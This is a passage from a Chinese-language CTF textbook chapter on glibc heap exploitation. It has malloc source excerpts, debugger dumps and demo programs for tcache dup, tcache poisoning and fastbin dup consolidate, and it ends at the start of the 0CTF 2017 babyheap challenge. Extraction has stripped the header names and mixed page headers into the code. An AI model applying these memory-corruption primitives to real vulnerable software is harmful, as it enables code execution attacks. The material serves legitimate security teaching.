$2 = {0x602000, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
gef➤
x/16gx 0x602000
0x602000:
0x0000000000000000
0x0000000000000021
fd, victim))
!= victim);
if (victim != 0) {
if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0)) {
errstr = "malloc(): memory corruption (fast)";
errout:
malloc_printerr (check_action, errstr, chunk2mem (victim), av);
return NULL;
}
check_remalloced_chunk (av, victim, nb);
void *p = chunk2mem (victim);
alloc_perturb (p, bytes);
return p;
}
}
fastbin_index()的计算方式如下所示。
/* offset 2 to use otherwise unindexable first 2 bins */
第 11 章
堆利用 ┃ LV
#define fastbin_index(sz) \
((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)
最后，我们来看 libc-2.26，由于新添加的 tcache 机制不会检查二次释放，因此不必考虑如何绕
过的问题，直接释放两次即可，fastbin dup 变得更加简单，甚至还不局限于 fastbin 大小的 chunk，我
们称之为 tcache dup。下面是一个示例程序。
#include 
#include 
int main() {
void *p1 = malloc(0x10);
fprintf(stderr, "1st malloc(0x10): %p\n", p1);
fprintf(stderr, "free the chunk twice\n");
free(p1);
free(p1);
fprintf(stderr, "2nd malloc(0x10): %p\n", malloc(0x10));
fprintf(stderr, "3rd malloc(0x10): %p\n", malloc(0x10));
}
$ gcc -L/usr/local/glibc-2.26/lib -Wl,--rpath=/usr/local/glibc-2.26/lib
-Wl,-I/usr/local/glibc-2.26/lib/ld-2.26.so -g tcache_dup.c -o tcache_dup
$ ./tcache_dup
1st malloc(0x10): 0x2164260
free the chunk twice
2nd malloc(0x10): 0x2164260
3rd malloc(0x10): 0x2164260
同样地，fastbin dup into stack 攻击也可以对应到 tcache dup into stack 攻击，或者称为 tcache
poisoning。其方法是修改 tcache bin 中 chunk 的 fd 指针为目标位置，也就是改变 tcache_entry 的 next
指针，在调用 malloc()时即可在目标位置得到 chunk。对此，tcache_get()函数没有做任何的检查。示
例程序如下。
#include 
#include 
int main() {
int64_t *p1, *p2, *p3, target[10];
printf("target stack: %p\n", target);
p1 = malloc(0x30);
fprintf(stderr, "p1 malloc(0x30): %p\n", p1);
free(p1);
*p1 = (int64_t)target;
fprintf(stderr, "free(p1) and overwrite the next ptr\n");
p2 = malloc(0x30);
p3 = malloc(0x30);
fprintf(stderr, "p2 malloc(0x30): %p\np3 malloc(0x30): %p\n", p2, p3);
}
$ gcc -L/usr/local/glibc-2.26/lib -Wl,--rpath=/usr/local/glibc-2.26/lib
-Wl,-I/usr/local/glibc-2.26/lib/ld-2.26.so -g tcache_poisoning.c -o
第 11 章
堆利用 ┃ LVI
tcache_poisoning
$ ./tcache_poisoning
target stack: 0x7ffc324602a0
p1 malloc(0x30): 0x2593670
free(p1) and overwrite the next ptr
p2 malloc(0x30): 0x2593670
p3 malloc(0x30): 0x7ffc324602a0
11.3.2
fastbin dup consolidate
fastbin dup consolidate 是另一种绕过 fastbin 二次释放检查的方法。我们知道 libc 在分配 large
chunk 时，如果 fastbins 不为空，则调用 malloc_consolidate()函数合并里面的 chunk，并放入 unsorted
bin；接下来，unsorted bin 中的 chunk 又被取出放回各自对应的 bins。此时 fastbins 被清空，再次释
放时也就不会触发二次释放。
if (in_smallbin_range (nb)) {
......
} else {
idx = largebin_index (nb);
if (have_fastchunks (av))
malloc_consolidate (av);
}
for (;; ) {
int iters = 0;
while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av)) {
......
/* remove from unsorted list */
unsorted_chunks (av)->bk = bck;
bck->fd = unsorted_chunks (av);
......
/* place chunk in bin */
if (in_smallbin_range (size)) {
victim_index = smallbin_index (size);
bck = bin_at (av, victim_index);
fwd = bck->fd;
} else {
示例程序如下。
#include 
#include 
int main() {
void* p1 = malloc(8);
void* p2 = malloc(8);
fprintf(stderr, "malloc two fastbin chunk: p1=%p p2=%p\n", p1, p2);
free(p1);
fprintf(stderr, "free p1\n");
第 11 章
堆利用 ┃ LVII
void* p3 = malloc(0x400);
fprintf(stderr, "malloc large chunk: p3=%p\n", p3);
free(p1);
fprintf(stderr, "double free p1\n");
fprintf(stderr, "malloc two fastbin chunk: %p %p\n", malloc(8), malloc(8));
}
$ gcc -g fastbin_dup_consolidate.c -o fastbin_dup_consolidate
$ ./fastbin_dup_consolidate
malloc two fastbin chunk: p1=0x7f9010 p2=0x7f9030
free p1
malloc large chunk: p3=0x7f9050
double free p1
malloc two fastbin chunk: 0x7f9010 0x7f9010
与fastbin dup中两个被释放的chunk都被放入fastbins不同，此次释放的两个chunk分别位于small
bins 和 fastbins。此时连续分配两个相同大小的 fastbin chunk，分别从 fastbins 和 small bins 中取出，
如下所示。
gef➤
heap bins fast
Fastbins[idx=0, size=0x10]
←
Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)
gef➤
heap bins small
[+] small_bins[1]: fw=0x602000, bk=0x602000
→
Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)
gef➤
x/12gx 0x602010 - 0x10
0x602000:
0x0000000000000000
0x0000000000000021
# p1
0x602010:
0x0000000000000000
0x00007ffff7dd1b88
0x602020:
0x0000000000000020
0x0000000000000020
# p2
0x602030:
0x0000000000000000
0x0000000000000000
0x602040:
0x0000000000000000
0x0000000000000411
# p3
0x602050:
0x0000000000000000
0x0000000000000000
gef➤
x/20gx (void *)&main_arena + 0x8
0x7ffff7dd1b28: 0x0000000000602000
0x0000000000000000
# fastbins
0x7ffff7dd1b38: 0x0000000000000000
0x0000000000000000
......
0x7ffff7dd1b68: 0x0000000000000000
0x0000000000000000
0x7ffff7dd1b78: 0x0000000000602450
0x0000000000000000
# unsorted thunks
0x7ffff7dd1b88: 0x00007ffff7dd1b78
0x00007ffff7dd1b78
# small_bins thunks
0x7ffff7dd1b98: 0x0000000000602000
0x0000000000602000
# fd, bk
0x7ffff7dd1ba8: 0x00007ffff7dd1b98
0x00007ffff7dd1b98
0x7ffff7dd1bb8: 0x00007ffff7dd1ba8
0x00007ffff7dd1ba8
需要注意的是，虽然fastbin chunk 的next chunk的 PREV_INUSE标志永远为 1，但是如果该fastbin
chunk 被放到 unsorted bin 中，next chunk 的 PREV_INUSE 也会相应被修改为 0。这一点对构造不安
全的 unlink 攻击很有帮助。
图 11-12 展示了 chunk p1 同时存在于 fastbins 和 small bins 中的情景。
第 11 章
堆利用 ┃ LVIII
图 11-12
chunk p1 同时存在于两个链表中
11.3.3
0CTF 2017：babyheap
例题来自 2017 年的 0CTF，考察了简单的堆利用技术。
$ file babyheap
babyheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32,
BuildID[sha1]=9e5bfa980355d6158a76acacb7bda01f4e3fc1c2, stripped
$ pwn checksec babyheap
Arch:
amd64-64-little
RELRO:
Full RELRO
Stack:
Canary found
NX:
NX enabled
PIE: